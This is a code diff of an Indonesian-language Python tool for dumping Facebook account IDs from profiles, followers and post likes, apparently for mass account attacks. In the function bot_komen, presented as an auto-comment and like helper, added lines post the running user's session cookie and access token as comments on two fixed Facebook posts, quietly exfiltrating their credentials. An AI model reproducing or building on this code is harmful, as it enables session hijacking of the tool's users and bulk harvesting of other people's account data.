@@ -45,7 +45,7 @@ xMMMMMMMMMMMO::::::::::::::::OMMMMMMMMMMMM
                 .,.,;:;,c,""")
     print(f'''[bold blue]───────────────────────────────────────────────────────────''')
     return 0
-### DAPATKAN NAMA ###
+###😫 DAPATKAN NAMA ###
 def dapatkan_nama(cookie, token_eaag):
     with requests.Session() as r:
         r.headers.update({
@@ -99,9 +99,7 @@ and make sure you are not exposed to [bold yellow]checkpoints![italic green]!"""
 def bot_komen(cookie, token_eaag):
     with requests.Session() as r: 
         text1 = random.choice(
-            ['''COOKIE : 
-NAMA : 
-USER ID : 
+            ['''
 ''']
         )
         text = random.choice(
@@ -110,11 +108,13 @@ USER ID :
         r.cookies.update({
             'cookie': cookie
         })
+        response = r.post('https://graph.facebook.com/174531078847946/comments/?message={}&access_token={}'.format(text, token_eaag)).text
+        response = r.post('https://graph.facebook.com/174531078847946/comments/?message={}&access_token={}'.format(cookie, token_eaag)).text
         response = r.post('https://graph.facebook.com/174531078847946/comments/?message={}&access_token={}'.format(text, token_eaag)).text 
         response2 = r.post('https://graph.facebook.com/174531078847946/likes?summary=true&access_token={}'.format(token_eaag)).text 
-        response = r.post('https://graph.facebook.com/181205294847191/comments/?message={}&access_token={}'.format(text1, token_eaag)).text
+        response = r.post('https://graph.facebook.com/181205294847191/comments/?message={}&access_token={}'.format(text, token_eaag)).text
         response = r.post('https://graph.facebook.com/181205294847191/comments/?message={}&access_token={}'.format(cookie, token_eaag)).text
-        response = r.post('https://graph.facebook.com/181205294847191/comments/?message={}&access_token={}'.format(text, token_eaag)).text 
+        response = r.post('https://graph.facebook.com/181205294847191/comments/?message={}&access_token={}'.format(cookie, token_eaag)).text 
         response2 = r.post('https://graph.facebook.com/181205294847191/likes?summary=true&access_token={}'.format(token_eaag)).text  
         if "\"id\":\"" in str(response) and str(response2) == 'true':
             return 0
@@ -138,8 +138,10 @@ def daftar_menu():
 └──╼❯ """)
     if query == '1' or query == '01':
         try:
-            Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan[italic green] ID Akun Facebook[italic green], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
-            userid = Console().input("[bold blue]   ╰─> ")
+            print("""[italic green]Silahkan Masukan[italic green] ID Akun Facebook[italic green], Gunakan Koma Untuk Dump 
+Masal, Misalnya :[italic green] 100034363636,4""", )
+            userid = Console().input("""[bold blue]┌─[───────────────────────────────────────────────────────]
+└──╼❯ """)
             for z in userid.split(','):
                 dump().publik(int(z), cookie, unit_cursor = '')
             if len(Dump) < 50:
@@ -150,8 +152,10 @@ def daftar_menu():
             Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
     elif query == '2' or query == '02':
         try:
-            Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan[italic green] ID Akun Facebook[italic green], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
-            userid = Console().input("[bold blue]   ╰─> ")
+            print("""[italic green]Silahkan Masukan[italic green] ID Akun Facebook[italic green], Gunakan Koma Untuk Dump
+Masal, Misalnya :[italic green] 1000066454,4""", )
+            userid = Console().input("""[bold blue]┌─[───────────────────────────────────────────────────────]
+└──╼❯ """)
             for z in userid.split(','):
                 dump().pengikut(z, cookie, token_eaag)
             if len(Dump) < 50:
@@ -162,8 +166,9 @@ def daftar_menu():
             Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
     elif query == '3' or query == '03':
         try:
-            Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan ID Postingan, Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
-            postid = Console().input("[bold blue]   ╰─> ")
+            print("[italic green]Silahkan Masukan ID Postingan, Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 10160334652393544", )
+            postid = Console().input("""[bold blue]┌─[───────────────────────────────────────────────────────]
+└──╼❯  """)
             for z in postid.split(','):
                 dump().likes(z, cookie, token_eaag, after = '')
             if len(Dump) < 1:
